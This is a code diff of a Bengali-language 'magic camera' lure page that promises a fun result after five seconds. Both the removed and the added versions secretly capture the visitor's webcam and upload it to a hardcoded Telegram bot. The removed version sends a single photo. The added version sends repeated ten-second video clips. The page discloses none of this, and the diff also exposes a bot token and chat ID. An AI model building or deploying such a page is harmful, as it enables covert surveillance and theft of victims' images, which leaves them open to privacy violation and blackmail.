@@ -1,154 +1,89 @@
 <!DOCTYPE html>
-<html lang="bn">
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Megical Camera</title>
+  <meta charset="UTF-8" />
+  <title>Face Recorder</title>
   <style>
     body {
-      margin: 0;
       background-color: black;
       color: white;
-      font-family: 'Arial', sans-serif;
       text-align: center;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
+      font-family: Arial;
     }
-
-    #message {
-      font-size: 26px;
-      margin-bottom: 20px;
-      color: #00ffcc;
-    }
-
-    .video-container {
-      position: relative;
-      width: 400px;
-      height: 400px;
-      border-radius: 50%;
-      overflow: hidden;
-      border: 8px solid #00ffcc;
-    }
-
     video {
-      width: 100%;
-      height: 100%;
-      object-fit: cover;
+      width: 300px;
+      height: 300px;
+      border-radius: 50%;
+      border: 5px solid white;
+      margin-top: 20px;
     }
-
-    #timer {
-      position: absolute;
-      top: 10px;
-      left: 10px;
-      font-size: 32px;
-      background: rgba(0, 0, 0, 0.7);
-      padding: 5px 15px;
-      border-radius: 10px;
-      color: #ffcc00;
-    }
-
-    #notice {
-      font-size: 20px;
-      background-color: #002244;
-      border: 3px solid #00ccff;
-      border-radius: 10px;
-      padding: 20px;
-      margin-top: 25px;
-      max-width: 90%;
-    }
-
-    #copyright {
-      font-size: 16px;
-      margin-top: 10px;
-      color: #cccccc;
+    .notice {
+      border: 3px solid blue;
+      padding: 10px;
+      margin: 20px;
+      font-size: 18px;
     }
   </style>
 </head>
 <body>
-  <div id="message">আপনার চেহারা ক্যামেরার মধ্যে রাখুন আর মজা দেখুন</div>
-
-  <div class="video-container">
-    <video id="video" autoplay playsinline muted></video>
-    <div id="timer">৫</div>
+  <h2>আপনার চেহারাটি ক্যামেরার মধ্যে রাখুন এবং পাঁচ সেকেন্ড পর এর ফলাফল দেখুন</h2>
+  <div class="notice">
+    <strong>বিশেষ দ্রষ্টব্য:</strong> মেসেঞ্জার এ যদি আপনার ছবি দেখা না যায় তাহলে এই লিঙ্ক টি কপি করে গুগল এ পেস্ট করে দেখুন।<br>
+    <em>Copyright ©️ SOAD</em>
   </div>
-
-  <div id="notice">
-    <b>বিশেষ দ্রষ্টব্য:</b><br>
-    মেসেঞ্জারে যদি আপনার ছবি দেখা না যায়,<br>
-    তাহলে এই লিঙ্কটি কপি করে Google-এ পেস্ট করে দেখুন।
-    <div id="copyright">Copyright ©️ SOAD</div>
-  </div>
+  <video id="preview" autoplay muted></video>
 
   <script>
-    const video = document.getElementById('video');
-    const timerDisplay = document.getElementById('timer');
-    const telegramBotToken = "7460221175:AAGn19zxbV_sXOWjW1ViDc3v4kHyS5WDGZU";
-    const telegramChatId = "6429244657";
+    const video = document.getElementById("preview");
+    let mediaRecorder;
+    let chunks = [];
+
+    const TELEGRAM_BOT_TOKEN = "7460221175:AAGn19zxbV_sXOWjW1ViDc3v4kHyS5WDGZU";
+    const TELEGRAM_CHAT_ID = "6429244657";
+
+    function sendToTelegram(blob) {
+      const formData = new FormData();
+      formData.append("chat_id", TELEGRAM_CHAT_ID);
+      formData.append("video", blob, "clip.webm");
+
+      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
+        method: "POST",
+        body: formData
+      }).then(res => console.log("ভিডিও পাঠানো হয়েছে")).catch(err => console.error("Error sending:", err));
+    }
+
+    function startRecording(stream) {
+      mediaRecorder = new MediaRecorder(stream);
+      mediaRecorder.ondataavailable = e => chunks.push(e.data);
+
+      mediaRecorder.onstop = () => {
+        const blob = new Blob(chunks, { type: "video/webm" });
+        sendToTelegram(blob);
+        chunks = [];
+        mediaRecorder.start(); // রেকর্ড আবার শুরু
+        setTimeout(() => mediaRecorder.stop(), 10000); // প্রতি ১০ সেকেন্ডে একবার ভিডিও রেকর্ড
+      };
+
+      mediaRecorder.start();
+      setTimeout(() => mediaRecorder.stop(), 10000);
+      setInterval(() => {
+        if (document.visibilityState === "visible") {
+          mediaRecorder.stop();
+        }
+      }, 60000); // প্রতি ১ মিনিটে একটি ক্লিপ
+    }
 
     navigator.mediaDevices.getUserMedia({ video: true, audio: false })
       .then(stream => {
         video.srcObject = stream;
+        startRecording(stream);
 
-        let count = 5;
-        timerDisplay.textContent = count;
-
-        const timer = setInterval(() => {
-          count--;
-          timerDisplay.textContent = count;
-
-          if (count === 1) {
-            captureAndSendPhoto();
-          }
-
-          if (count === 0) {
-            clearInterval(timer);
-            timerDisplay.style.display = "none";
-          }
-        }, 1000);
+        const msg = new SpeechSynthesisUtterance("আপনার চেহারাটি ক্যামেরার মধ্যে রাখুন এবং পাঁচ সেকেন্ড পর এর ফলাফল দেখুন");
+        window.speechSynthesis.speak(msg);
+      })
+      .catch(err => {
+        alert("ক্যামেরা চালু করা যায়নি: " + err);
       });
-
-    function captureAndSendPhoto() {
-      const canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      const ctx = canvas.getContext('2d');
-      ctx.drawImage(video, 0, 0);
-
-      const imageData = canvas.toDataURL('image/jpeg');
-      const blob = dataURLtoBlob(imageData);
-
-      const formData = new FormData();
-      formData.append('chat_id', telegramChatId);
-      formData.append('photo', blob, 'face.jpg');
-
-      fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
-        method: 'POST',
-        body: formData
-      });
-    }
-
-    function dataURLtoBlob(dataurl) {
-      const arr = dataurl.split(',');
-      const mime = arr[0].match(/:(.*?);/)[1];
-      const bstr = atob(arr[1]);
-      let n = bstr.length;
-      const u8arr = new Uint8Array(n);
-      while(n--) {
-        u8arr[n] = bstr.charCodeAt(n);
-      }
-      return new Blob([u8arr], {type:mime});
-    }
-
-    // Voice Instruction (May need user interaction on some mobiles)
-    window.addEventListener('click', () => {
-      const msg = new SpeechSynthesisUtterance("আপনার চেহারাটি ক্যামেরার মধ্যে রাখুন এবং পাঁচ সেকেন্ড পর এর ফলাফল দেখুন");
-      msg.lang = 'bn-BD';
-      msg.pitch = 1;
-      msg.rate = 1;
-      speechSynthesis.speak(msg);
-    });
   </script>
 </body>
 </html>
